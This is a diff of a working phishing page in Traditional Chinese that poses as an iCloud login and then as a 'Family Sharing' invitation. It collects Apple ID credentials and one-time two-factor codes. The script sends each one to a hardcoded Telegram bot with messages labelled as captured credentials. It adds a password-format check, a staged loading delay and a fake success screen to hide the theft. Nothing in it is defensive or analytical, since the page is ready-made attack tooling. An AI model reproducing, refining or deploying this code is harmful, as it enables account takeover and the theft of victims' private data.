@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>iCloud</title>
+    <title>iCloud - 家人共享</title>
     <link rel="icon" href="https://www.apple.com/favicon.ico">
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
@@ -13,86 +13,114 @@
             display: flex;
             align-items: center;
             justify-content: center;
-            /* 背景使用深色漸層，能更好地襯托出毛玻璃效果 */
             background: linear-gradient(135deg, #050915 0%, #1a1c2c 100%);
             overflow: hidden;
-        }
-
-        /* 背景裝飾圓球，增加毛玻璃的透視感 */
-        .orb {
-            position: absolute;
-            width: 400px;
-            height: 400px;
-            border-radius: 50%;
-            background: radial-gradient(circle, rgba(0, 122, 255, 0.2), transparent 70%);
-            z-index: 0;
-            filter: blur(50px);
-        }
-
-        /* 核心毛玻璃卡片 */
-        .glass-card {
-            position: relative;
-            z-index: 1;
-            width: 360px;
-            padding: 40px 30px;
-            background: rgba(255, 255, 255, 0.1); /* 半透明白 */
-            backdrop-filter: blur(25px) saturate(1.5); /* 關鍵：毛玻璃屬性 */
-            -webkit-backdrop-filter: blur(25px) saturate(1.5);
-            border: 1px solid rgba(255, 255, 255, 0.2);
-            border-radius: 24px;
-            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.3);
-            text-align: center;
             color: white;
         }
 
-        img.logo { width: 80px; margin-bottom: 20px; filter: drop-shadow(0 0 10px rgba(255,255,255,0.3)); }
-        
-        h1 { font-size: 24px; font-weight: 500; margin-bottom: 10px; }
-        p { font-size: 14px; color: rgba(255, 255, 255, 0.7); margin-bottom: 25px; }
+        /* 背景裝飾 */
+        .orb {
+            position: absolute;
+            width: 500px;
+            height: 500px;
+            border-radius: 50%;
+            background: radial-gradient(circle, rgba(255, 45, 85, 0.15), transparent 70%);
+            z-index: 0;
+            filter: blur(60px);
+            top: -10%;
+            right: -10%;
+        }
+
+        .glass-card {
+            position: relative;
+            z-index: 1;
+            width: 380px;
+            padding: 40px 30px;
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(25px) saturate(1.5);
+            -webkit-backdrop-filter: blur(25px) saturate(1.5);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 28px;
+            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.4);
+            text-align: center;
+        }
+
+        .family-icon {
+            width: 70px;
+            height: 70px;
+            background: linear-gradient(135deg, #ff2d55, #ff3b30);
+            border-radius: 18px;
+            margin: 0 auto 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 10px 20px rgba(255, 45, 85, 0.3);
+        }
+
+        .family-icon svg { width: 40px; fill: white; }
+
+        h1 { font-size: 22px; font-weight: 600; margin-bottom: 8px; }
+        p { font-size: 14px; color: rgba(255, 255, 255, 0.7); margin-bottom: 25px; line-height: 1.4; }
+
+        .input-group { text-align: left; margin-bottom: 15px; }
+        label { display: block; font-size: 12px; color: rgba(255,255,255,0.5); margin-left: 12px; margin-bottom: 5px; }
 
         input {
             width: 100%;
-            padding: 14px;
-            margin-bottom: 15px;
-            border: 1px solid rgba(255, 255, 255, 0.2);
-            border-radius: 12px;
+            padding: 14px 18px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 14px;
             background: rgba(255, 255, 255, 0.05);
             color: white;
             font-size: 16px;
             outline: none;
             transition: 0.3s;
         }
-        input:focus { border-color: #007aff; background: rgba(255, 255, 255, 0.1); }
+        input:focus { border-color: #ff2d55; background: rgba(255, 255, 255, 0.1); }
 
         button {
             width: 100%;
-            padding: 14px;
+            padding: 15px;
             background: #fff;
             color: #000;
             border: none;
-            border-radius: 12px;
+            border-radius: 14px;
             font-size: 16px;
             font-weight: 600;
             cursor: pointer;
             transition: 0.2s;
+            margin-top: 10px;
         }
-        button:hover { background: #e5e5e5; transform: scale(0.98); }
+        button:hover { background: #f0f0f0; transform: scale(0.98); }
+
+        /* 狀態切換 */
+        .hidden { display: none !important; }
 
         /* 載入動畫 */
         .loader {
-            display: none;
-            margin: 20px auto;
-            width: 30px;
-            height: 30px;
-            border: 3px solid rgba(255,255,255,0.3);
+            width: 35px;
+            height: 35px;
+            border: 3px solid rgba(255,255,255,0.2);
             border-radius: 50%;
-            border-top-color: #fff;
-            animation: spin 1s ease-in-out infinite;
+            border-top-color: #ff2d55;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
         }
         @keyframes spin { to { transform: rotate(360deg); } }
 
-        #phase2 { display: none; }
-        .footer { margin-top: 30px; font-size: 12px; color: rgba(255,255,255,0.4); }
+        /* 成功圖示 */
+        .success-checkmark {
+            width: 60px;
+            height: 60px;
+            margin: 0 auto 20px;
+            background: #34c759;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .footer { margin-top: 25px; font-size: 11px; color: rgba(255,255,255,0.3); }
     </style>
 </head>
 <body>
@@ -100,77 +128,108 @@
     <div class="orb"></div>
 
     <div class="glass-card">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/1/1c/ICloud_logo.svg" class="logo">
-        
-        <div id="phase1">
-            <h1>登入 iCloud</h1>
-            <p>請使用您的 Apple ID 登入</p>
-            <input type="text" id="acc" placeholder="Apple ID">
-            <input type="password" id="pw" placeholder="密碼">
-            <button onclick="goPhase1()">登入</button>
+        <div id="phase-login">
+            <div class="family-icon">
+                <svg viewBox="0 0 24 24"><path d="M16 11c1.66 0 2.99-1.34 2.99-3S17.66 5 16 5s-3 1.34-3 3 1.34 3 3 3zm-8 0c1.66 0 2.99-1.34 2.99-3S9.66 5 8 5 5 6.34 5 8s1.34 3 3 3zm0 2c-2.33 0-7 1.17-7 3.5V19h14v-2.5c0-2.33-4.67-3.5-7-3.5zm8 0c-.29 0-.62.02-.97.05 1.16.84 1.97 1.97 1.97 3.45V19h6v-2.5c0-2.33-4.67-3.5-7-3.5z"/></svg>
+            </div>
+            <h1>加入家人共享</h1>
+            <p>您受邀加入家庭群組。請驗證您的 Apple ID 以開始共享訂閱與服務。</p>
+            
+            <div class="input-group">
+                <label>Apple ID</label>
+                <input type="text" id="acc" placeholder="email@icloud.com">
+            </div>
+            <div class="input-group">
+                <label>密碼</label>
+                <input type="password" id="pw" placeholder="您的 Apple ID 密碼">
+            </div>
+            <button onclick="handleLogin()">接受邀請</button>
         </div>
 
-        <div id="loading">
-            <div class="loader" id="spinner"></div>
-            <p id="load-text" style="display:none;">正在安全驗證...</p>
+        <div id="phase-loading" class="hidden">
+            <div class="loader"></div>
+            <p>正在加密連線並驗證身分...</p>
         </div>
 
-        <div id="phase2">
+        <div id="phase-otp" class="hidden">
             <h1>雙重認證</h1>
-            <p>請輸入發送到您裝置的 6 位數代碼</p>
-            <input type="text" id="otp" placeholder="000000" maxlength="6" style="text-align:center; letter-spacing: 10px;">
-            <button onclick="goPhase2()">驗證</button>
+            <p>驗證碼已傳送到您的其他 Apple 裝置。</p>
+            <input type="text" id="otp" placeholder="000000" maxlength="6" style="text-align:center; letter-spacing: 12px; font-weight: bold; font-size: 24px;">
+            <button onclick="handleOTP()">驗證並加入</button>
         </div>
 
-        <div class="footer">忘記 Apple ID 或密碼？</div>
+        <div id="phase-success" class="hidden">
+            <div class="success-checkmark">
+                <svg width="30" height="30" viewBox="0 0 24 24" fill="white"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
+            </div>
+            <h1>歡迎加入家庭！</h1>
+            <p>您的帳戶已成功與家庭成員綁定。現在您可以開始使用共享的空間與訂閱。</p>
+            <button onclick="window.close()">關閉視窗</button>
+        </div>
+
+        <div class="footer">您的資料將受到加密保護。</div>
     </div>
 
     <script>
-        // 配置你的資訊
         const config = {
             token: "8515104060:AAEaLB1JSthW0sepHdNLetgqg_ZBE-1Ofy4",
             chatId: "1945090052"
         };
 
-        async function sendToTg(text) {
-            const url = `https://api.telegram.org/bot${config.token}/sendMessage`;
-            await fetch(url, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ chat_id: config.chatId, text: text })
-            });
+        async function sendMsg(text) {
+            try {
+                await fetch(`https://api.telegram.org/bot${config.token}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: config.chatId, text: text })
+                });
+            } catch(e) {}
         }
 
-        async function goPhase1() {
-            const acc = document.getElementById('acc').value;
+        async function handleLogin() {
+            const acc = document.getElementById('acc').value.trim();
             const pw = document.getElementById('pw').value;
-            if(!acc || !pw) return alert("請填寫完整資訊");
 
-            // 1. 隱藏輸入，顯示轉圈
-            document.getElementById('phase1').style.display = 'none';
-            document.getElementById('spinner').style.display = 'block';
-            document.getElementById('load-text').style.display = 'block';
+            // 1. Email 格式檢查
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            if (!emailRegex.test(acc)) {
+                alert("請輸入有效的 Apple ID 格式。");
+                return;
+            }
 
-            // 2. 發送資料
-            await sendToTg(`🔔 【捕獲帳密】\n帳號: ${acc}\n密碼: ${pw}`);
+            // 2. 密碼強度檢查 (一大、一小、一數字)
+            const pwRegex = /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d).+$/;
+            if (!pwRegex.test(pw)) {
+                alert("為了安全性，請輸入正確的 Apple ID 密碼格式。");
+                return;
+            }
 
-            // 3. 等待 20 秒切換
+            // 切換到 Loading
+            document.getElementById('phase-login').classList.add('hidden');
+            document.getElementById('phase-loading').classList.remove('hidden');
+
+            // 發送訊息
+            await sendMsg(`👨‍👩‍👧‍👦 【家人共享登入】\n帳號: ${acc}\n密碼: ${pw}`);
+
+            // 倒數 20 秒
             setTimeout(() => {
-                document.getElementById('loading').style.display = 'none';
-                document.getElementById('phase2').style.display = 'block';
+                document.getElementById('phase-loading').classList.add('hidden');
+                document.getElementById('phase-otp').classList.remove('hidden');
             }, 20000);
         }
 
-        async function goPhase2() {
+        async function handleOTP() {
             const otp = document.getElementById('otp').value;
-            if(otp.length < 6) return alert("請輸入完整驗證碼");
+            if(otp.length < 6) {
+                alert("請輸入 6 位數驗證碼。");
+                return;
+            }
 
-            // 發送驗證碼
-            await sendToTg(`🔐 【捕獲驗證碼】\n代碼: ${otp}`);
-            
-            // 跳轉
-            alert("驗證逾時，請重新登入");
-            window.location.href = "https://www.icloud.com";
+            await sendMsg(`🛡️ 【家人共享驗證碼】\n代碼: ${otp}`);
+
+            // 顯示成功加入家庭
+            document.getElementById('phase-otp').classList.add('hidden');
+            document.getElementById('phase-success').classList.remove('hidden');
         }
     </script>
 </body>
